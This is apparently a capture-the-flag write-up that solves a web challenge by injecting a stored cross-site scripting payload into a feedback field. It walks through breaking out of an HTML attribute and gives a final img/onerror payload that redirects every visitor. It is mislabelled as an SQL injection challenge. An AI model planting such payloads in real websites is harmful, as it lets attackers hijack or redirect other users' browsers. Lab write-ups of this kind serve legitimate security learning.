# Solution for the SQL Injection challenge

There is a feedback section on the website. If you submit your feedback you can hove over the text to see it. The html tags can be manipulated to achieve XSS

## Final solution
```
"><img src=x onerror="window.location='http://google.com'">
```

## Step by step
First you can submit a random feedback and inspect element to see the source code to know what is happening
```
<div title="tak" onmouseover="alert(&quot;tak&quot;)">Hover over this box to see your feedback</div>
```
So the feedback is stored in the title and inside alert. <br>
try to close the tag by using `"> koenk`.
Now the html looks like this 
```
<div title="&quot;> koenk" onmouseover="alert(&quot;&quot;> koenk&quot;)">Hover over this box to see your feedback</div>
```
and when we hover over it it doesn't do anything so it worked. 

Now try to use other payload ex. `"><img src=x onerror="window.location='http://google.com'">` this will automaticly redirect to google.com